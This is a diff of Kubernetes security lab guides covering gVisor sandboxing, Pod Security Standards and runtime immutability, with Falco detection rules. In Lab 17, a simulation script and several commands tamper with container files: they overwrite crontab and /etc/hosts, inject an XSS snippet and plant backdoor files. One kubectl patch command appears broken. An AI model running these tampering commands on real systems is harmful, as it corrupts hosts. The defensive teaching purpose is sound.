-            port: 8080
-          initialDelaySeconds: 30
-          periodSeconds: 10
-        readinessProbe:
-          httpGet:
-            path: /health
-            port: 8080
-          initialDelaySeconds: 5
-          periodSeconds: 5
-        volumeMounts:
-        - name: tmp-volume
-          mountPath: /tmp
-      volumes:
-      - name: tmp-volume
-        emptyDir: {}
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: minimal-app-service
-  namespace: secure-microservices
-spec:
-  selector:
-    app: minimal-app
-  ports:
-  - port: 80
-    targetPort: 8080
-  type: ClusterIP
-EOF
-
-# Deploy the minimal application
-kubectl apply -f minimal-app-deployment.yaml
-
-# Verify deployment
-kubectl get pods -n secure-microservices -l app=minimal-app
-kubectl logs -n secure-microservices deployment/minimal-app
-
-Subtask 2.5: Test Application Functionality
-
-# Test the application
-kubectl port-forward -n secure-microservices service/minimal-app-service 8080:80 &
-sleep 5
-
-# Test the endpoints
-curl http://localhost:8080/
-curl http://localhost:8080/health
-
-# Stop port forwarding
-pkill -f "kubectl port-forward"
-
-Task 3: Test Application Sandboxing Using gVisor
-Subtask 3.1: Verify gVisor Installation
-
-gVisor provides an additional layer of isolation by implementing a user-space kernel.
-
-# Check if gVisor (runsc) is available
-which runsc
-runsc --version
-
-# Check available container runtimes
-kubectl get nodes -o wide
-
-# Verify gVisor runtime class exists
-kubectl get runtimeclass
-
-Subtask 3.2: Create gVisor Runtime Class
-
-If gVisor runtime class doesn't exist, let's create it.
-
-# Create gVisor runtime class
-cat << 'EOF' > gvisor-runtime-class.yaml
-apiVersion: node.k8s.io/v1
-kind: RuntimeClass
-metadata:
-  name: gvisor
-handler: runsc
-EOF
-
-# Apply the runtime class
-kubectl apply -f gvisor-runtime-class.yaml
-
-# Verify runtime class creation
-kubectl get runtimeclass gvisor -o yaml
-
-Subtask 3.3: Deploy Application with gVisor Sandboxing
-
-# Create a sandboxed application deployment
-cat << 'EOF' > sandboxed-app-deployment.yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: sandboxed-app
-  namespace: secure-microservices
-spec:
-  replicas: 2
-  selector:
-    matchLabels:
-      app: sandboxed-app
-  template:
-    metadata:
-      labels:
-        app: sandboxed-app
-    spec:
-      runtimeClassName: gvisor  # Use gVisor runtime
-      securityContext:
-        runAsNonRoot: true
-        runAsUser: 1000
-        runAsGroup: 1000
-        fsGroup: 1000
-      containers:
-      - name: app
-        image: microservice-app:alpine
-        securityContext:
-          allowPrivilegeEscalation: false
-          readOnlyRootFilesystem: true
-          runAsNonRoot: true
-          runAsUser: 1000
-          capabilities:
-            drop:
-            - ALL
-        ports:
-        - containerPort: 8080
-        resources:
-          requests:
-            memory: "128Mi"  # gVisor needs more memory
-            cpu: "100m"
-          limits:
-            memory: "256Mi"
-            cpu: "200m"
-        livenessProbe:
-          httpGet:
-            path: /health
-            port: 8080
-          initialDelaySeconds: 45  # Longer delay for gVisor startup
-          periodSeconds: 10
-        readinessProbe:
-          httpGet:
-            path: /health
-            port: 8080
-          initialDelaySeconds: 10
-          periodSeconds: 5
-        volumeMounts:
-        - name: tmp-volume
-          mountPath: /tmp
-      volumes:
-      - name: tmp-volume
-        emptyDir: {}
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: sandboxed-app-service
-  namespace: secure-microservices
-spec:
-  selector:
-    app: sandboxed-app
-  ports:
-  - port: 80
-    targetPort: 8080
-  type: ClusterIP
-EOF
-
-# Deploy the sandboxed application
-kubectl apply -f sandboxed-app-deployment.yaml
-
-# Monitor the deployment
-kubectl get pods -n secure-microservices -l app=sandboxed-app -w
-
-Subtask 3.4: Verify gVisor Sandboxing
-
-# Check that pods are using gVisor runtime
-kubectl get pods -n secure-microservices -l app=sandboxed-app -o yaml | grep -A 5 -B 5 runtimeClassName
-
-# Get detailed pod information
-kubectl describe pods -n secure-microservices -l app=sandboxed-app
-
-# Check the container runtime being used
-kubectl get pods -n secure-microservices -l app=sandboxed-app -o jsonpath='{.items[0].status.containerStatuses[0].containerID}'
-
-Subtask 3.5: Test Sandboxed Application Security
-
-# Test system call restrictions in gVisor
-kubectl exec -n secure-microservices deployment/sandboxed-app -- cat /proc/version
-
-# Compare with regular container
-kubectl exec -n secure-microservices deployment/minimal-app -- cat /proc/version
-
-# Test file system access
-kubectl exec -n secure-microservices deployment/sandboxed-app -- ls -la /
-
-# Test network functionality
-kubectl port-forward -n secure-microservices service/sandboxed-app-service 8081:80 &
-sleep 5
-
-curl http://localhost:8081/
-curl http://localhost:8081/health
-
-# Stop port forwarding
-pkill -f "kubectl port-forward"
-
-Subtask 3.6: Performance and Security Comparison
-
-# Create a test script to compare performance
-cat << 'EOF' > performance-test.sh
-#!/bin/bash
-
-echo "Testing Regular Container Performance:"
-kubectl exec -n secure-microservices deployment/minimal-app -- time python -c "
-import time
-start = time.time()
-for i in range(1000):
-    pass
-print(f'Execution time: {time.time() - start:.4f} seconds')
-"
-
-echo -e "\nTesting gVisor Sandboxed Container Performance:"
-kubectl exec -n secure-microservices deployment/sandboxed-app -- time python -c "
-import time
-start = time.time()
-for i in range(1000):
-    pass
-print(f'Execution time: {time.time() - start:.4f} seconds')
-"
-
-echo -e "\nResource Usage Comparison:"
-kubectl top pods -n secure-microservices
-EOF
-
-chmod +x performance-test.sh
-./performance-test.sh
-
-Task 4: Security Analysis and Verification
-Subtask 4.1: Analyze Security Posture
-
-# Check all deployments security configurations
-kubectl get pods -n secure-microservices -o yaml | grep -A 10 -B 5 securityContext
-
-# Verify Pod Security Standards compliance
-kubectl get events -n secure-microservices --field-selector reason=FailedCreate
-
-# Check resource usage and limits
-kubectl describe pods -n secure-microservices | grep -A 5 -B 5 "Limits\|Requests"
-
-Subtask 4.2: Network Security Testing
-
-# Test network policies (create a basic network policy)
-cat << 'EOF' > network-policy.yaml
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: secure-microservices-policy
-  namespace: secure-microservices
-spec:
-  podSelector: {}
-  policyTypes:
-  - Ingress
-  - Egress
-  ingress:
-  - from:
-    - namespaceSelector:
-        matchLabels:
-          name: secure-microservices
-    ports:
-    - protocol: TCP
-      port: 8080
-  egress:
-  - to: []
-    ports:
-    - protocol: TCP
-      port: 53
-    - protocol: UDP
-      port: 53
-  - to: []
-    ports:
-    - protocol: TCP
-      port: 443
-EOF
-
-kubectl apply -f network-policy.yaml
-
-# Verify network policy
-kubectl get networkpolicy -n secure-microservices
-kubectl describe networkpolicy secure-microservices-policy -n secure-microservices
-
-Subtask 4.3: Create Security Summary Report
-
-# Generate a comprehensive security report
-cat << 'EOF' > generate-security-report.sh
-#!/bin/bash
-
-echo "=== MICROSERVICE SECURITY REPORT ==="
-echo "Generated on: $(date)"
-echo
-
-echo "1. NAMESPACE SECURITY CONFIGURATION:"
-kubectl get namespace secure-microservices --show-labels
-echo
-
-echo "2. POD SECURITY STANDARDS:"
-kubectl get pods -n secure-microservices -o custom-columns="NAME:.metadata.name,RUNTIME:.spec.runtimeClassName,USER:.spec.securityContext.runAsUser,NON-ROOT:.spec.securityContext.runAsNonRoot"
-echo
-
-echo "3. IMAGE SIZES:"
-docker images | grep microservice-app
-echo
-
-echo "4. RESOURCE USAGE:"
-kubectl top pods -n secure-microservices 2>/dev/null || echo "Metrics server not available"
-echo
-
-echo "5. SECURITY CONTEXTS:"
-kubectl get pods -n secure-microservices -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[0].securityContext}{"\n"}{end}'
-echo
-
-echo "6. NETWORK POLICIES:"
-kubectl get networkpolicy -n secure-microservices
-echo
-
-echo "=== END OF REPORT ==="
-EOF
-
-chmod +x generate-security-report.sh
-./generate-security-report.sh > security-report.txt
-cat security-report.txt
-
-Troubleshooting Common Issues
-Issue 1: Pod Security Standard Violations
-
-If pods fail to start due to security policy violations:
-
-# Check events for security violations
-kubectl get events -n secure-microservices --sort-by='.lastTimestamp'
-
-# Common fixes:
-# - Ensure runAsNonRoot: true
-# - Set appropriate runAsUser (non-zero)
-# - Drop all capabilities
-# - Set allowPrivilegeEscalation: false
-
-Issue 2: gVisor Runtime Issues
-
-If gVisor pods fail to start:
-
-# Check if gVisor is properly installed
-sudo runsc --version
-
-# Check runtime class configuration
-kubectl describe runtimeclass gvisor
-
-# Verify node supports gVisor
-kubectl describe node | grep -i runtime
-
-Issue 3: Image Build Problems
-
-If Docker builds fail:
-
-# Check Docker daemon status
-sudo systemctl status docker
-
-# Clean up Docker cache
-docker system prune -f
-
-# Rebuild with verbose output
-docker build --no-cache -f Dockerfile.alpine -t microservice-app:alpine .
-
-Cleanup
-
-# Remove all resources created in this lab
-kubectl delete namespace secure-microservices
-kubectl delete runtimeclass gvisor
-
-# Remove Docker images
-docker rmi microservice-app:standard microservice-app:alpine microservice-app:distroless
-
-# Clean up files
-cd ~
-rm -rf microservice-app
-rm -f *.yaml *.sh *.txt
-
-Conclusion
-
-In this lab, you have successfully implemented three critical security measures for microservices:
-
-Pod Security Standards: You deployed applications using the Baseline Pod Security Standard, which provides essential security controls without being overly restrictive. This prevents common privilege escalation attacks and ensures containers run with appropriate security contexts.
-
-Minimal Base Images: You reduced the attack surface by using Alpine Linux instead of full Ubuntu images, achieving significant size reduction (often 10x smaller). Smaller images mean fewer potential vulnerabilities, faster deployment times, and reduced storage costs.
-
-gVisor Sandboxing: You implemented application sandboxing using gVisor, which provides an additional layer of isolation by running containers in a user-space kernel. This significantly reduces the risk of container escape attacks.
-
-Key Security Benefits Achieved: • Reduced attack surface through minimal images • Enhanced isolation with gVisor sandboxing • Enforced security policies with Pod Security Standards • Implemented defense-in-depth security strategy • Maintained application functionality while improving security
-
-These techniques are essential for production microservice deployments and are commonly tested in the Certified Kubernetes Security Specialist (CKS) certification. The combination of these security measures provides robust protection against common container and Kubernetes security threats while maintaining operational efficiency.
-
-Best Practices Learned: • Always use minimal base images when possible • Implement Pod Security Standards appropriate for your environment • Consider runtime sandboxing for high-security requirements • Monitor resource usage impact of security measures • Test security configurations thoroughly before production deployment
-
-
-
-
-
-
-Lab 17: Immutability at Runtime Lab
-Objectives
-
-By the end of this lab, students will be able to:
-
-• Understand the concept of runtime immutability in containerized environments • Configure and implement runtime immutability policies for containers using Kubernetes • Simulate unauthorized file system changes in running containers • Deploy and configure monitoring tools to detect runtime modifications • Set up alerting mechanisms for immutability violations • Analyze security events and respond to runtime threats • Apply best practices for maintaining container immutability in production environments
-Prerequisites
-
-Before starting this lab, students should have:
-
-• Basic understanding of Linux command line operations • Familiarity with Docker containers and containerization concepts • Knowledge of Kubernetes fundamentals including pods, deployments, and services • Understanding of YAML configuration files • Basic knowledge of security concepts in containerized environments • Familiarity with text editors like vim or nano
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with all necessary tools installed. Simply click Start Lab to access your environment - no need to build your own VM or install additional software.
-
-Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes cluster (single-node) • Docker runtime pre-installed • kubectl command-line tool configured • Falco security monitoring tool • All necessary permissions and network configurations
-Task 1: Configure Runtime Immutability Policies for Containers
-Subtask 1.1: Understanding Runtime Immutability
-
-Runtime immutability means that once a container starts running, its file system should not be modified. This security practice helps prevent: • Malware injection during runtime • Unauthorized configuration changes • Data tampering attacks • Privilege escalation attempts
-Subtask 1.2: Create a Basic Application Container
-
-First, let's create a simple web application that we'll use throughout this lab.
-
-    Create a working directory for the lab:
-
-mkdir ~/immutability-lab
-cd ~/immutability-lab
-
-    Create a simple HTML file for our web application:
-
-cat > index.html << 'EOF'
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Immutable Web App</title>
-</head>
-<body>
-    <h1>Welcome to the Immutable Web Application</h1>
-    <p>This application demonstrates runtime immutability concepts.</p>
-    <p>Current time: <span id="time"></span></p>
-    <script>
-        document.getElementById('time').innerHTML = new Date().toLocaleString();
-    </script>
-</body>
-</html>
-EOF
-
-    Create a Dockerfile for our application:
-
-cat > Dockerfile << 'EOF'
-FROM nginx:alpine
-COPY index.html /usr/share/nginx/html/
-EXPOSE 80
-CMD ["nginx", "-g", "daemon off;"]
-EOF
-
-    Build the Docker image:
-
-docker build -t immutable-webapp:v1.0 .
-
-Subtask 1.3: Create Kubernetes Deployment with Read-Only Root Filesystem
-
-    Create a Kubernetes deployment with read-only root filesystem:
-
-cat > immutable-deployment.yaml << 'EOF'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: immutable-webapp
-  labels:
-    app: immutable-webapp
-spec:
-  replicas: 2
-  selector:
-    matchLabels:
-      app: immutable-webapp
-  template:
-    metadata:
-      labels:
-        app: immutable-webapp
-    spec:
-      containers:
-      - name: webapp
-        image: immutable-webapp:v1.0
-        ports:
-        - containerPort: 80
-        securityContext:
-          readOnlyRootFilesystem: true
-          runAsNonRoot: true
-          runAsUser: 101
-          allowPrivilegeEscalation: false
-          capabilities:
-            drop:
-            - ALL
-        volumeMounts:
-        - name: tmp-volume
-          mountPath: /tmp
-        - name: var-cache-nginx
-          mountPath: /var/cache/nginx
-        - name: var-run
-          mountPath: /var/run
-      volumes:
-      - name: tmp-volume
-        emptyDir: {}
-      - name: var-cache-nginx
-        emptyDir: {}
-      - name: var-run
-        emptyDir: {}
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: immutable-webapp-service
-spec:
-  selector:
-    app: immutable-webapp
-  ports:
-  - port: 80
-    targetPort: 80
-  type: NodePort
-EOF
-
-    Apply the deployment:
-
-kubectl apply -f immutable-deployment.yaml
-
-    Verify the deployment is running:
-
-kubectl get pods -l app=immutable-webapp
-kubectl get svc immutable-webapp-service
-
-Subtask 1.4: Implement Pod Security Standards
-
-    Create a namespace with restricted Pod Security Standards:
-
-cat > secure-namespace.yaml << 'EOF'
-apiVersion: v1
-kind: Namespace
-metadata:
-  name: secure-apps
-  labels:
-    pod-security.kubernetes.io/enforce: restricted
-    pod-security.kubernetes.io/audit: restricted
-    pod-security.kubernetes.io/warn: restricted
-EOF
-
-    Apply the secure namespace:
-
-kubectl apply -f secure-namespace.yaml
-
-    Deploy the application in the secure namespace:
-
-kubectl apply -f immutable-deployment.yaml -n secure-apps
-
-    Verify the deployment in the secure namespace:
-
-kubectl get pods -n secure-apps -l app=immutable-webapp
-
-Task 2: Simulate Unauthorized File Changes in a Running Container
-Subtask 2.1: Create a Vulnerable Application for Testing
-
-    Create a deployment without immutability controls for comparison:
-
-cat > vulnerable-deployment.yaml << 'EOF'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: vulnerable-webapp
-  labels:
-    app: vulnerable-webapp
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: vulnerable-webapp
-  template:
-    metadata:
-      labels:
-        app: vulnerable-webapp
-    spec:
-      containers:
-      - name: webapp
-        image: immutable-webapp:v1.0
-        ports:
-        - containerPort: 80
-        # Note: No securityContext restrictions
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: vulnerable-webapp-service
-spec:
-  selector:
-    app: vulnerable-webapp
-  ports:
-  - port: 80
-    targetPort: 80
-  type: NodePort
-EOF
-
-    Deploy the vulnerable application:
-
-kubectl apply -f vulnerable-deployment.yaml
-
-Subtask 2.2: Attempt File Modifications in Immutable Container
-
-    Get the pod name for the immutable application:
-
-IMMUTABLE_POD=$(kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[0].metadata.name}')
-echo "Immutable pod: $IMMUTABLE_POD"
-
-    Try to modify files in the immutable container:
-
-# This should fail due to read-only filesystem
-kubectl exec -it $IMMUTABLE_POD -- sh -c "echo 'malicious content' > /usr/share/nginx/html/malicious.html"
-
-    Try to modify the main HTML file:
-
-# This should also fail
-kubectl exec -it $IMMUTABLE_POD -- sh -c "echo 'HACKED!' >> /usr/share/nginx/html/index.html"
-
-    Verify that temporary directories are still writable:
-
-# This should succeed as /tmp is mounted as writable
-kubectl exec -it $IMMUTABLE_POD -- sh -c "echo 'temp file' > /tmp/test.txt && cat /tmp/test.txt"
-
-Subtask 2.3: Demonstrate Successful Modifications in Vulnerable Container
-
-    Get the pod name for the vulnerable application:
-
-VULNERABLE_POD=$(kubectl get pods -l app=vulnerable-webapp -o jsonpath='{.items[0].metadata.name}')
-echo "Vulnerable pod: $VULNERABLE_POD"
-
-    Successfully modify files in the vulnerable container:
-
-# This will succeed
-kubectl exec -it $VULNERABLE_POD -- sh -c "echo '<h2>SYSTEM COMPROMISED!</h2>' >> /usr/share/nginx/html/index.html"
-
-    Create a malicious file:
-
-kubectl exec -it $VULNERABLE_POD -- sh -c "echo 'Malicious script content' > /usr/share/nginx/html/backdoor.html"
-
-    Verify the changes:
-
-kubectl exec -it $VULNERABLE_POD -- cat /usr/share/nginx/html/index.html
-kubectl exec -it $VULNERABLE_POD -- ls -la /usr/share/nginx/html/
-
-Subtask 2.4: Simulate Advanced Attack Scenarios
-
-    Create a script that simulates various attack patterns:
-
-cat > attack-simulation.sh << 'EOF'
-#!/bin/bash
-
-POD_NAME=$1
-if [ -z "$POD_NAME" ]; then
-    echo "Usage: $0 <pod-name>"
-    exit 1
-fi
-
-echo "=== Simulating Attack Scenarios on $POD_NAME ==="
-
-echo "1. Attempting to modify system binaries..."
-kubectl exec -it $POD_NAME -- sh -c "echo 'malicious' > /bin/malicious_binary" 2>/dev/null && echo "SUCCESS: Binary modification" || echo "BLOCKED: Binary modification"
-
-echo "2. Attempting to modify configuration files..."
-kubectl exec -it $POD_NAME -- sh -c "echo 'malicious_config' > /etc/nginx/nginx.conf" 2>/dev/null && echo "SUCCESS: Config modification" || echo "BLOCKED: Config modification"
-
-echo "3. Attempting to create persistence mechanisms..."
-kubectl exec -it $POD_NAME -- sh -c "echo '*/5 * * * * /bin/malicious_script' > /etc/crontab" 2>/dev/null && echo "SUCCESS: Cron job created" || echo "BLOCKED: Cron job creation"
-
-echo "4. Attempting to modify web content..."
-kubectl exec -it $POD_NAME -- sh -c "echo '<script>alert(\"XSS\")</script>' >> /usr/share/nginx/html/index.html" 2>/dev/null && echo "SUCCESS: Web content modified" || echo "BLOCKED: Web content modification"
-
-echo "5. Attempting to install additional software..."
-kubectl exec -it $POD_NAME -- sh -c "apk add --no-cache curl" 2>/dev/null && echo "SUCCESS: Software installed" || echo "BLOCKED: Software installation"
-
-echo "=== Attack simulation complete ==="
-EOF
-
-chmod +x attack-simulation.sh
-
-    Run the attack simulation on both containers:
-
-echo "Testing immutable container:"
-./attack-simulation.sh $IMMUTABLE_POD
-
-echo -e "\nTesting vulnerable container:"
-./attack-simulation.sh $VULNERABLE_POD
-
-Task 3: Use Monitoring Tools to Detect and Alert on Changes
-Subtask 3.1: Install and Configure Falco for Runtime Security Monitoring
-
-    Install Falco using Helm:
-
-# Add the Falco Helm repository
-helm repo add falcosecurity https://falcosecurity.github.io/charts
-helm repo update
-
-    Create a custom Falco configuration:
-
-cat > falco-values.yaml << 'EOF'
-falco:
-  grpc:
-    enabled: true
-  grpcOutput:
-    enabled: true
-  httpOutput:
-    enabled: true
-    url: "http://localhost:8080/events"
-  jsonOutput: true
-  jsonIncludeOutputProperty: true
-  
-driver:
-  kind: ebpf
-
-falcoctl:
-  artifact:
-    install:
-      enabled: true
-    follow:
-      enabled: true
-
-services:
-  - name: k8saudit
-    type: ClusterIP
-    ports:
-      - port: 9765
-        targetPort: 9765
-        protocol: TCP
-        name: grpc
-EOF
-
-    Install Falco:
-
-helm install falco falcosecurity/falco -f falco-values.yaml
-
-    Verify Falco installation:
-
-kubectl get pods -l app.kubernetes.io/name=falco
-kubectl logs -l app.kubernetes.io/name=falco --tail=20
-
-Subtask 3.2: Create Custom Falco Rules for Immutability Violations
-
-    Create custom Falco rules for detecting immutability violations:
-
-cat > custom-immutability-rules.yaml << 'EOF'
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: falco-custom-rules
-  labels:
-    app.kubernetes.io/name: falco
-data:
-  custom_rules.yaml: |
-    - rule: Write below root filesystem in container
-      desc: Detect attempts to write to the root filesystem in containers with read-only root
-      condition: >
-        spawned_process and container and
-        (fd.typechar = 'f' and fd.num >= 0 and 
-         (open_write or create_file) and
-         not fd.name startswith "/tmp" and
-         not fd.name startswith "/var/run" and
-         not fd.name startswith "/var/cache" and
-         not fd.name startswith "/dev" and
-         not fd.name startswith "/proc" and
-         not fd.name startswith "/sys")
-      output: >
-        Attempt to write to read-only root filesystem 
-        (user=%user.name command=%proc.cmdline file=%fd.name 
-         container_id=%container.id container_name=%container.name 
-         image=%container.image.repository:%container.image.tag)
-      priority: WARNING
-      tags: [filesystem, container, immutability]
-
-    - rule: Modify web application files
-      desc: Detect modifications to web application files
-      condition: >
-        spawned_process and container and
-        (open_write or create_file) and
-        (fd.name startswith "/usr/share/nginx/html" or
-         fd.name startswith "/var/www" or
-         fd.name contains ".html" or
-         fd.name contains ".js" or
-         fd.name contains ".css")
-      output: >
-        Web application file modification detected 
-        (user=%user.name command=%proc.cmdline file=%fd.name 
-         container_id=%container.id container_name=%container.name 
-         image=%container.image.repository:%container.image.tag)
-      priority: ERROR
-      tags: [web, application, tampering]
-
-    - rule: Package management in container
-      desc: Detect package management operations in containers
-      condition: >
-        spawned_process and container and
-        (proc.name in (apk, apt, apt-get, yum, dnf, zypper, pip, npm, gem))
-      output: >
-        Package management operation in container 
-        (user=%user.name command=%proc.cmdline 
-         container_id=%container.id container_name=%container.name 
-         image=%container.image.repository:%container.image.tag)
-      priority: WARNING
-      tags: [package, installation, container]
-
-    - rule: Suspicious file creation in container
-      desc: Detect creation of suspicious files in containers
-      condition: >
-        spawned_process and container and
-        create_file and
-        (fd.name contains "backdoor" or
-         fd.name contains "malicious" or
-         fd.name contains ".sh" and fd.directory in ("/tmp", "/var/tmp") or
-         fd.name endswith ".php" and fd.directory startswith "/usr/share/nginx/html")
-      output: >
-        Suspicious file created in container 
-        (user=%user.name command=%proc.cmdline file=%fd.name 
-         container_id=%container.id container_name=%container.name 
-         image=%container.image.repository:%container.image.tag)
-      priority: CRITICAL
-      tags: [malware, backdoor, container]
-EOF
-
-    Apply the custom rules:
-
-kubectl apply -f custom-immutability-rules.yaml
-
-    Update Falco to use the custom rules:
-
-kubectl patch configmap falco -p '{"data":{"falco.yaml":"$(kubectl get configmap falco -o jsonpath='{.data.falco\.yaml}' | sed 's/rules_file:/rules_file:\n  - \/etc\/falco\/custom_rules.yaml\n  #- /g')"}}'
-
-    Restart Falco to load the new rules:
-
-kubectl rollout restart daemonset falco
-kubectl rollout status daemonset falco
-
-Subtask 3.3: Set Up Log Monitoring and Alerting
-
-    Create a simple log monitoring script:
-
-cat > monitor-falco-alerts.sh << 'EOF'
-#!/bin/bash
-
-echo "=== Starting Falco Alert Monitor ==="
-echo "Monitoring for immutability violations..."
-echo "Press Ctrl+C to stop monitoring"
-echo ""
-
-# Get Falco pod name
-FALCO_POD=$(kubectl get pods -l app.kubernetes.io/name=falco -o jsonpath='{.items[0].metadata.name}')
-
-if [ -z "$FALCO_POD" ]; then
-    echo "Error: Falco pod not found"
-    exit 1
-fi
-
-echo "Monitoring Falco pod: $FALCO_POD"
-echo "----------------------------------------"
-
-# Monitor Falco logs in real-time
-kubectl logs -f $FALCO_POD | while read line; do
-    # Check if the line contains our custom rules
-    if echo "$line" | grep -q -E "(Write below root filesystem|Modify web application files|Package management in container|Suspicious file creation)"; then
-        echo "🚨 ALERT: $line"
-        echo "Time: $(date)"
-        echo "----------------------------------------"
-    elif echo "$line" | grep -q "Priority:"; then
-        echo "📋 Event: $line"
-    fi
-done
-EOF
-
-chmod +x monitor-falco-alerts.sh
-
-    Create an alert webhook simulator:
-
-cat > alert-webhook.py << 'EOF'
-#!/usr/bin/env python3
-import http.server
-import socketserver
-import json
-from datetime import datetime
-
-class AlertHandler(http.server.BaseHTTPRequestHandler):
-    def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length)
-        
-        try:
-            alert_data = json.loads(post_data.decode('utf-8'))
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            
-            print(f"\n🚨 SECURITY ALERT RECEIVED at {timestamp}")
-            print("=" * 50)
-            print(f"Priority: {alert_data.get('priority', 'Unknown')}")
-            print(f"Rule: {alert_data.get('rule', 'Unknown')}")
-            print(f"Output: {alert_data.get('output', 'No details')}")
-            print("=" * 50)
-            
-            # Send response
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({"status": "received"}).encode())
-            
-        except Exception as e:
-            print(f"Error processing alert: {e}")
-            self.send_response(400)
-            self.end_headers()
-    
-    def log_message(self, format, *args):
-        # Suppress default logging
-        pass
-
-if __name__ == "__main__":
-    PORT = 8080
-    print(f"Starting Alert Webhook Server on port {PORT}")
-    print("Waiting for security alerts...")
-    
-    with socketserver.TCPServer(("", PORT), AlertHandler) as httpd:
-        httpd.serve_forever()
-EOF
-
-chmod +x alert-webhook.py
-
-Subtask 3.4: Test the Monitoring System
-
-    Start the alert monitoring in one terminal:
-
-# Run this in a separate terminal or background process
-./monitor-falco-alerts.sh &
-MONITOR_PID=$!
-
-    Start the webhook server in another terminal:
-
-# Run this in a separate terminal
-python3 alert-webhook.py &
-WEBHOOK_PID=$!
-
-    Generate test alerts by performing suspicious activities:
-
-echo "=== Generating Test Alerts ==="
-
-# Test 1: Attempt to modify web content in vulnerable container
-echo "Test 1: Modifying web content..."
-kubectl exec -it $VULNERABLE_POD -- sh -c "echo 'ALERT TEST' >> /usr/share/nginx/html/index.html"
-
-sleep 5
-
-# Test 2: Create suspicious files
-echo "Test 2: Creating suspicious files..."
-kubectl exec -it $VULNERABLE_POD -- sh -c "echo 'backdoor script' > /tmp/backdoor.sh"
-
-sleep 5
-
-# Test 3: Attempt package installation
-echo "Test 3: Attempting package installation..."
-kubectl exec -it $VULNERABLE_POD -- sh -c "apk update" 2>/dev/null || true
-
-sleep 5
-
-# Test 4: Try to modify system files
-echo "Test 4: Attempting system file modification..."
-kubectl exec -it $VULNERABLE_POD -- sh -c "echo 'malicious' > /etc/hosts" 2>/dev/null || true
-
-echo "=== Test alerts generated ==="
-
-    Check the monitoring output:
-
-# Wait a moment for alerts to be processed
-sleep 10
-
-# Check recent Falco logs
-kubectl logs -l app.kubernetes.io/name=falco --tail=50 | grep -E "(ALERT|Priority|Write below root|Modify web|Package management|Suspicious file)"
-
-Subtask 3.5: Create Automated Response Scripts
-
-    Create an automated response script:
-
-cat > automated-response.sh << 'EOF'
-#!/bin/bash
-
-# Automated response to immutability violations
-respond_to_violation() {
-    local container_id=$1
-    local violation_type=$2
-    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
-    
-    echo "[$timestamp] AUTOMATED RESPONSE TRIGGERED"
-    echo "Container ID: $container_id"
-    echo "Violation Type: $violation_type"
-    
-    # Log the incident
-    echo "[$timestamp] SECURITY INCIDENT: $violation_type in container $container_id" >> /tmp/security-incidents.log
-    
-    # Get pod information
-    local pod_name=$(kubectl get pods --all-namespaces -o json | jq -r ".items[] | select(.status.containerStatuses[]?.containerID | contains(\"$container_id\")) | .metadata.name" 2>/dev/null)
-    
-    if [ ! -z "$pod_name" ]; then
-        echo "Affected Pod: $pod_name"
-        
-        # Option 1: Restart the pod (uncomment to enable)
-        # echo "Restarting affected pod..."
-        # kubectl delete pod $pod_name
-        
-        # Option 2: Scale down the deployment (uncomment to enable)
-        # echo "Scaling down deployment..."
-        # kubectl scale deployment vulnerable-webapp --replicas=0
-        
-        # Option 3: Add security label for quarantine
-        echo "Marking pod for security review..."
-        kubectl label pod $pod_name security-violation=true --overwrite
-        
-        # Send notification (simulate)
-        echo "📧 NOTIFICATION: Security team notified about violation in $pod_name"
-    fi
-    
-    echo "Automated response completed."
-    echo "----------------------------------------"
-}
-
-# Example usage
-if [ "$#" -eq 2 ]; then
-    respond_to_violation "$1" "$2"
-else
-    echo "Usage: $0 <container_id> <violation_type>"
-    echo "Example: $0 abc123 'file_modification'"
-fi
-EOF
-
-chmod +x automated-response.sh
-
-    Test the automated response:
-
-# Simulate a response to a violation
-./automated-response.sh "test-container-123" "unauthorized_file_modification"
-
-# Check the incident log
-cat /tmp/security-incidents.log
-
-Task 4: Advanced Monitoring and Analysis
-Subtask 4.1: Implement File Integrity Monitoring
-
-    Create a file integrity monitoring script:
-
-cat > file-integrity-monitor.sh << 'EOF'
-#!/bin/bash
-
-# File Integrity Monitoring for containers
-BASELINE_DIR="/tmp/baselines"
-mkdir -p $BASELINE_DIR
-
-create_baseline() {
-    local pod_name=$1
-    local container_name=${2:-webapp}
-    
-    echo "Creating baseline for $pod_name..."
-    
-    # Create checksums for important files
-    kubectl exec $pod_name -c $container_name -- find /usr/share/nginx/html -type f -exec sha256sum {} \; > "$BASELINE_DIR/${pod_name}_baseline.txt" 2>/dev/null
-    
-    if [ $? -eq 0 ]; then
-        echo "Baseline created: $BASELINE_DIR/${pod_name}_baseline.txt"
-        echo "Files monitored:"
-        cat "$BASELINE_DIR/${pod_name}_baseline.txt"
-    else
-        echo "Failed to create baseline for $pod_name"
-    fi
-}
-
-check_integrity() {
-    local pod_name=$1
-    local container_name=${2:-webapp}
-    local baseline_file="$BASELINE_DIR/${pod_name}_baseline.txt"
-    
-    if [ ! -f "$baseline_file" ]; then
-        echo "No baseline found for $pod_name. Creating one..."
-        create_baseline $pod_name $container_name
-        return
-    fi
-    
-    echo "Checking integrity for $pod_name..."
-    
-    # Get current checksums
-    local current_checksums=$(mktemp)
-    kubectl exec $pod_name -c $container_name -- find /usr/share/nginx/html -type f -exec sha256sum {} \; > "$current_checksums" 2>/dev/null
-    
-    if [ $? -ne 0 ]; then
-        echo "Failed to get current checksums from $pod_name"
-        rm -f "$current_checksums"
-        return
-    fi
-    
-    # Compare with baseline
-    local changes=$(diff "$baseline_file" "$current_checksums")
